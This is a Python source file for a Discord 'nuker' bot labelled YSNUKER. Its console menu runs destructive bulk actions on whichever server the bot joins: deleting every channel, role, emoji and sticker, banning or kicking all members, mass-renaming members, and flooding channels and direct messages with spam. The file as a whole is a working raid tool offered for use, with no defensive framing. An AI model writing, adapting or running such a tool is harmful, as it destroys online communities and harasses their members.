import discord
from discord.ext import commands
import asyncio
import sys
import threading
import time
import os
import requests
import subprocess
from version import VERSION
from colorama import Fore, Style, init

# Initialize colorama for terminal colors
init(autoreset=True)

# Check if the token was provided as an argument
if len(sys.argv) < 2:
    print(Fore.RED + "Usage: python bot.py <TOKEN>" + Style.RESET_ALL)
    sys.exit(1)

TOKEN = sys.argv[1]

# Enable the required intents
intents = discord.Intents.default()
intents.members = True            # For operations on members
intents.message_content = True    # For accessing message content

# Initialize the bot
bot = commands.Bot(command_prefix="!", intents=intents)
selected_guild = None  # The server to operate on

@bot.event
async def on_ready():
    global selected_guild
    os.system("cls" if os.name == "nt" else "clear")  # Clear the terminal
    print(Fore.GREEN + f"Bot connected as {bot.user}" + Style.RESET_ALL)
    # If the bot is in one or more servers, select the first one
    if bot.guilds:
        selected_guild = bot.guilds[0]
        print(Fore.YELLOW + f"Selected server: {selected_guild.name} (ID: {selected_guild.id})" + Style.RESET_ALL)
    else:
        print(Fore.RED + "No servers found!" + Style.RESET_ALL)

    # Display the menu header
    print(Fore.BLUE + """
__  _______ _   ____  ____ __ __________
\ \/ / ___// | / / / / / //_// ____/ __ \\
 \\  / __ \\/  |/ / / / / ,<  / __/ / /_/ /
 / / /_/ / /|  / /_/ / /| |/ /___/ _, _/
/_/\\____/_/ |_\\____/_/ |_/_____/_/ |_|
                                        """ + Style.RESET_ALL)

# -------------------------- ASYNC FUNCTIONS --------------------------


def check_for_updates():
    print("Checking for updates...")
    try:
        # Replace 'user/repo' with your GitHub repository details
        response = requests.get("https://api.github.com/repos/user/repo/releases/latest")
        response.raise_for_status()
        latest_version = response.json()["tag_name"]

        if VERSION != latest_version:
            print(f"New version available: {latest_version}. You're using {VERSION}.")
            user_input = input("Would you like to update to the latest version? (y/n): ").lower()
            if user_input == "y":
                print("Updating...")
                subprocess.run(["pip", "install", "--upgrade", "your_package"])
                print("Update complete! Please restart the program.")
            else:
                print("Update skipped.")
        else:
            print("You're already using the latest version.")
    except Exception as e:
        print(f"Failed to check for updates: {e}")

# Run check at startup
check_for_updates()

async def delete_all_channels(guild: discord.Guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + f"[OK] Deleted channel: {channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not delete channel {channel.name}: {e}" + Style.RESET_ALL)

async def delete_all_roles(guild: discord.Guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(Fore.GREEN + f"[OK] Deleted role: {role.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[ERROR] Could not delete role {role.name}: {e}" + Style.RESET_ALL)

async def create_channels(guild: discord.Guild, amount: int, channel_name: str):
    for i in range(amount):
        try:
            await guild.create_text_channel(channel_name)
            print(Fore.GREEN + f"[OK] Created channel: {channel_name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not create channel {channel_name}: {e}" + Style.RESET_ALL)

async def send_messages(guild: discord.Guild, amount: int, message_text: str):
    for channel in guild.text_channels:
        for i in range(amount):
            try:
                await channel.send(message_text)
                print(Fore.GREEN + f"[OK] Sent message in {channel.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[ERROR] Could not send message in channel {channel.name}: {e}" + Style.RESET_ALL)

async def change_server_name(guild: discord.Guild, new_name: str):
    try:
        await guild.edit(name=new_name)
        print(Fore.GREEN + f"[OK] Server name changed to: {new_name}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[ERROR] Could not change server name: {e}" + Style.RESET_ALL)

async def nickname_all(guild: discord.Guild, new_nickname: str):
    for member in guild.members:
        # Skip bots including the bot stesso
        if member.bot:
            continue
        try:
            await member.edit(nick=new_nickname)
            print(Fore.GREEN + f"[OK] Changed nickname for {member.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not change nickname for {member.name}: {e}" + Style.RESET_ALL)

async def ban_all_members(guild: discord.Guild):
    # Ban all members except the owner and the bot itself
    for member in guild.members:
        if member.id == guild.owner_id:
            print(Fore.YELLOW + f"[SKIP] Cannot ban owner {member.name}" + Style.RESET_ALL)
            continue
        if member == guild.me:
            continue
        try:
            await guild.ban(member, reason="Ban All Members Command")
            print(Fore.GREEN + f"[OK] Banned: {member.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not ban {member.name}: {e}" + Style.RESET_ALL)

async def kick_all_members(guild: discord.Guild):
    # Kick all members except the owner and the bot itself
    for member in guild.members:
        if member.id == guild.owner_id:
            print(Fore.YELLOW + f"[SKIP] Cannot kick owner {member.name}" + Style.RESET_ALL)
            continue
        if member == guild.me:
            continue
        try:
            await member.kick(reason="Kick All Members Command")
            print(Fore.GREEN + f"[OK] Kicked: {member.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not kick {member.name}: {e}" + Style.RESET_ALL)

async def dm_all_members(guild: discord.Guild, amount: int, message_text: str):
    for member in guild.members:
        if member.bot:
            continue
        try:
            for i in range(amount):
                await member.send(message_text)
            print(Fore.GREEN + f"[OK] Sent DM to {member.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not send DM to {member.name}: {e}" + Style.RESET_ALL)

# Nuove funzionalità

async def delete_all_emojis(guild: discord.Guild):
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            print(Fore.GREEN + f"[OK] Deleted emoji: {emoji.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not delete emoji {emoji.name}: {e}" + Style.RESET_ALL)

async def delete_all_stickers(guild: discord.Guild):
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            print(Fore.GREEN + f"[OK] Deleted sticker: {sticker.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not delete sticker {sticker.name}: {e}" + Style.RESET_ALL)

async def delete_all_soundboard(guild: discord.Guild):
    # Questa funzione tenta di eliminare gli elementi dello "soundboard"
    # Se l'attributo non è disponibile, verrà mostrato un messaggio di avviso.
    try:
        if hasattr(guild, "soundboard"):
            for sound in guild.soundboard:
                try:
                    await sound.delete()
                    print(Fore.GREEN + f"[OK] Deleted soundboard item: {sound.name}" + Style.RESET_ALL)
                except Exception as e:
                    print(Fore.RED + f"[ERROR] Could not delete soundboard item {sound.name}: {e}" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[SKIP] Soundboard feature is not available in this guild or discord.py version." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[ERROR] Error while deleting soundboard items: {e}" + Style.RESET_ALL)

async def kick_server_boosters(guild: discord.Guild):
    # Scorre tutti i membri e se un membro sta boostando il server (premium_since non è None),
    # lo espelle (escludendo owner e il bot stesso)
    for member in guild.members:
        if member.premium_since is not None:
            if member.id == guild.owner_id:
                print(Fore.YELLOW + f"[SKIP] Cannot kick owner {member.name}" + Style.RESET_ALL)
                continue
            if member == guild.me:
                continue
            try:
                await member.kick(reason="Kick Server Boosters Command")
                print(Fore.GREEN + f"[OK] Kicked server booster: {member.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[ERROR] Could not kick server booster {member.name}: {e}" + Style.RESET_ALL)

async def create_roles(guild: discord.Guild, amount: int, role_name: str, role_color: str):
    try:
        # Rimuove il carattere '#' se presente e converte il valore esadecimale in un oggetto Color
        if role_color.startswith('#'):
            role_color = role_color[1:]
        color_int = int(role_color, 16)
        color_obj = discord.Color(color_int)
    except Exception as e:
        print(Fore.RED + f"[ERROR] Invalid color value '{role_color}': {e}" + Style.RESET_ALL)
        return

    for i in range(amount):
        try:
            new_role_name = role_name if amount == 1 else f"{role_name} {i+1}"
            await guild.create_role(name=new_role_name, color=color_obj)
            print(Fore.GREEN + f"[OK] Created role: {new_role_name} with color #{role_color.upper()}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not create role {new_role_name}: {e}" + Style.RESET_ALL)

# -------------------------- ESECUZIONE DELLE OPERAZIONI --------------------------

# FUNCTION TO EXECUTE AN OPERATION IN A "NEW CONSOLE" (simulated by clearing the screen)
def execute_option(coro, operation_name: str):
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + f"\n=== {operation_name} in progress ===" + Style.RESET_ALL)
    future = asyncio.run_coroutine_threadsafe(coro, bot.loop)
    try:
        future.result()  # Wait for the operation to complete
    except Exception as exc:
        print(Fore.RED + f"Error during {operation_name}: {exc}" + Style.RESET_ALL)
    print(Fore.GREEN + f"\n=== {operation_name} completed ===" + Style.RESET_ALL)
    input("Press Enter to return to the menu...")
    os.system("cls" if os.name == "nt" else "clear")
    # Add ASCII art and menu heading again after operation
    print(Fore.BLUE + """
__  _______ _   ____  ____ __ __________
\ \/ / ___// | / / / / / //_// ____/ __ \\
 \\  / __ \\/  |/ / / / / ,<  / __/ / /_/ /
 / / /_/ / /|  / /_/ / /| |/ /___/ _, _/
/_/\\____/_/ |_\\____/_/ |_/_____/_/ |_|
                                        """ + Style.RESET_ALL)

def menu_loop():
    global selected_guild
    # Wait for the bot to connect and select a server
    while selected_guild is None:
        time.sleep(1)
    while True:

        print(Fore.GREEN + "=== CREATE ===" + Style.RESET_ALL)
        print(Fore.YELLOW + "  1) Create Channels" + Style.RESET_ALL)
        print(Fore.YELLOW + "  2) Create Roles" + Style.RESET_ALL)

        print(Fore.RED + "=== DELETE ===" + Style.RESET_ALL)
        print(Fore.YELLOW + "  3) Delete All Channels" + Style.RESET_ALL)
        print(Fore.YELLOW + "  4) Delete All Roles" + Style.RESET_ALL)
        print(Fore.YELLOW + "  5) Delete All Emojis" + Style.RESET_ALL)
        print(Fore.YELLOW + "  6) Delete All Stickers" + Style.RESET_ALL)
        print(Fore.YELLOW + "  7) Delete All Soundboard" + Style.RESET_ALL)

        print(Fore.CYAN + "=== EXTRA ===" + Style.RESET_ALL)
        print(Fore.YELLOW + "  8) Send Messages" + Style.RESET_ALL)
        print(Fore.YELLOW + "  9) Change Server Name" + Style.RESET_ALL)
        print(Fore.YELLOW + " 10) Nickname All Members" + Style.RESET_ALL)
        print(Fore.YELLOW + " 11) DM All Members" + Style.RESET_ALL)
        print(Fore.YELLOW + " 12) Ban All Members" + Style.RESET_ALL)
        print(Fore.YELLOW + " 13) Kick All Members" + Style.RESET_ALL)
        print(Fore.YELLOW + " 14) Kick Server Boosters" + Style.RESET_ALL)

        print(Fore.RED + "  exit) Exit + Turn OFF Bot" + Style.RESET_ALL)
        
        choice = input(Fore.CYAN + "\nEnter the Option: " + Style.RESET_ALL).strip()

        if choice.lower() == "exit":
            asyncio.run_coroutine_threadsafe(bot.close(), bot.loop)
            break

        elif choice == "1":
            try:
                amount = int(input(Fore.CYAN + "Enter the number of channels to create: " + Style.RESET_ALL).strip())
            except ValueError:
                print(Fore.RED + "Invalid number entered!" + Style.RESET_ALL)
                continue
            channel_name = input(Fore.CYAN + "Enter the name for the channels: " + Style.RESET_ALL).strip()
            coro = create_channels(selected_guild, amount, channel_name)
            execute_option(coro, f"Creating {amount} channels named '{channel_name}'")

        elif choice == "2":
            try:
                amount = int(input(Fore.CYAN + "Enter the number of roles to create: " + Style.RESET_ALL).strip())
            except ValueError:
                print(Fore.RED + "Invalid number entered!" + Style.RESET_ALL)
                continue
            role_name = input(Fore.CYAN + "Enter the name for the roles: " + Style.RESET_ALL).strip()
            role_color = input(Fore.CYAN + "Enter the role color (hex, e.g., #FF0000): " + Style.RESET_ALL).strip()
            coro = create_roles(selected_guild, amount, role_name, role_color)
            execute_option(coro, f"Creating {amount} roles named '{role_name}' with color '{role_color}'")

        elif choice == "3":
            execute_option(delete_all_channels(selected_guild), "Deleting all channels")

        elif choice == "4":
            execute_option(delete_all_roles(selected_guild), "Deleting all roles")

        elif choice == "5":
            execute_option(delete_all_emojis(selected_guild), "Deleting all emojis")

        elif choice == "6":
            execute_option(delete_all_stickers(selected_guild), "Deleting all stickers")

        elif choice == "7":
            execute_option(delete_all_soundboard(selected_guild), "Deleting all soundboard items")

        elif choice == "8":
            try:
                amount = int(input(Fore.CYAN + "Enter the number of messages to send per channel: " + Style.RESET_ALL).strip())
            except ValueError:
                print(Fore.RED + "Invalid number entered!" + Style.RESET_ALL)
                continue
            message_text = input(Fore.CYAN + "Enter the message to send: " + Style.RESET_ALL).strip()
            coro = send_messages(selected_guild, amount, message_text)
            execute_option(coro, f"Sending {amount} messages per channel")

        elif choice == "9":
            new_name = input(Fore.CYAN + "Enter the new server name: " + Style.RESET_ALL).strip()
            execute_option(change_server_name(selected_guild, new_name), f"Changing server name to '{new_name}'")

        elif choice == "10":
            new_nick = input(Fore.CYAN + "Enter the new nickname for all members: " + Style.RESET_ALL).strip()
            execute_option(nickname_all(selected_guild, new_nick), f"Updating all nicknames to '{new_nick}'")

        elif choice == "11":
            try:
                amount = int(input(Fore.CYAN + "Enter the number of DMs to send per member: " + Style.RESET_ALL).strip())
            except ValueError:
                print(Fore.RED + "Invalid number entered!" + Style.RESET_ALL)
                continue
            message_text = input(Fore.CYAN + "Enter the DM message to send: " + Style.RESET_ALL).strip()
            coro = dm_all_members(selected_guild, amount, message_text)
            execute_option(coro, f"Sending DM {amount} times to each member")

        elif choice == "12":
            execute_option(ban_all_members(selected_guild), "Banning all members")

        elif choice == "13":
            execute_option(kick_all_members(selected_guild), "Kicking all members")

        elif choice == "14":
            execute_option(kick_server_boosters(selected_guild), "Kicking server boosters")

        else:
            print(Fore.RED + "Invalid option. Please try again." + Style.RESET_ALL)

# -------------------------- Start Menu Thread and Run Bot --------------------------

menu_thread = threading.Thread(target=menu_loop, daemon=True)
menu_thread.start()

bot.run(TOKEN)
